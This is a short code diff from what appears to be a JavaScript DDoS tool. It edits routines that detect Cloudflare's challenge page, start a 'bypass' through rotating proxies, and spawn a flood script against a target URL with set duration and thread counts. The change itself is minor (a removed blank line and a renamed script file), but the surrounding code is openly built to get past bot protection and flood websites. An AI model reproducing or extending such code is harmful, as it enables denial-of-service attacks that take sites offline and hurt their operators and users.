@@ -275,7 +275,6 @@ const detectChallenge = async (browser, page, browserProxy) => {
             coloredLog(COLORS.RED, `[INFO] Proxy blocked: ${maskProxy(browserProxy)}`);
             throw new Error('Proxy blocked');
         }
-
         if (content.includes('challenge-platform')) {
             coloredLog(COLORS.WHITE, `[INFO] Starting bypass for proxy: ${maskProxy(browserProxy)}`);
             await sleep(5);
@@ -451,7 +450,7 @@ const startThread = async (targetURL, browserProxy, task, done, retries = 0) => 
                 ].join(', ')}`);
 
                 const floodProcess = spawn('node', [
-                    'floodbrs.js',
+                    'flood.js',
                     targetURL,
                     duration.toString(),
                     threads.toString(), // Sử dụng threads thay vì thread
